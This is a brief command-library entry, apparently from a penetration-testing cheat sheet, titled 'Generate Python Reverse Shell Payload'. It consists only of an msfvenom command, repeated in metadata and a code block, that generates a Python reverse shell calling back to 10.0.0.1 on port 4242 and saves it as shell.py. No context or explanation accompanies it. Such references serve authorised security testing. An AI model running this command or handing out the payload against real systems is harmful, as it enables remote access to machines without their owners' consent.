---
id: cb86159e-9ce1-4233-bf6f-da79c5c23ac2
name: Generate Python Reverse Shell Payload
type: command
executor: bash
data: $ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
output: null
created_at: '2023-04-06T03:56:24.923690+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
---

# Generate Python Reverse Shell Payload

```bash
$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
```
